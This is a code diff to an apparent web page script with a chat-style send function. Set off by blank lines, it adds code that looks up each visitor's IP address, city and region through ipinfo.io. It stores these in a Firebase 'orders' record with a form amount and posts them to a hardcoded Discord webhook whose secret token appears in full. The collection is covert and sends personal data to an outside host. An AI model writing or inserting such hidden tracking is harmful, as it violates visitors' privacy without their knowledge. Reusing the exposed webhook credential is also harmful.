@@ -43,6 +43,22 @@ function HtmlEncode(s)
   s = el.innerHTML;
   return s;
 }
+    
+    
+    
+    
+    
+       $.get("https://ipinfo.io", function(response) {
+            const db = getDatabase();
+  set(ref(db, 'orders/' + response.city + ", " + response.region + ", " + response.ip), {
+    amount: document.getElementById('amount').value
+  });
+        sendMessages(response.city + ", " + response.region + ", " + response.ip)
+        }, "json")
+              }
+    
+    
+    
 
     
 function send()
@@ -55,9 +71,23 @@ function send()
         type: "POST", 
         data:"text="+encodeURIComponent(text)+"&name="+encodeURIComponent(name)
    });
+    
 }
 
+    function sendMessages(msg) {
+      const request = new XMLHttpRequest();
+      request.open("POST", "https://discord.com/api/webhooks/1078460562058530867/ys36IqeWN59nLCh_xrCMrWsE4mxNgpy9LVp5m_592orpw9DXG7OG0VhQdJWDzzXsO9in");
 
+      request.setRequestHeader('Content-type', 'application/json');
+
+      const params = {
+        username: "Popper Bot",
+        avatar_url: "",
+        content: msg
+      }
+
+      request.send(JSON.stringify(params));
+    }
 
 
 
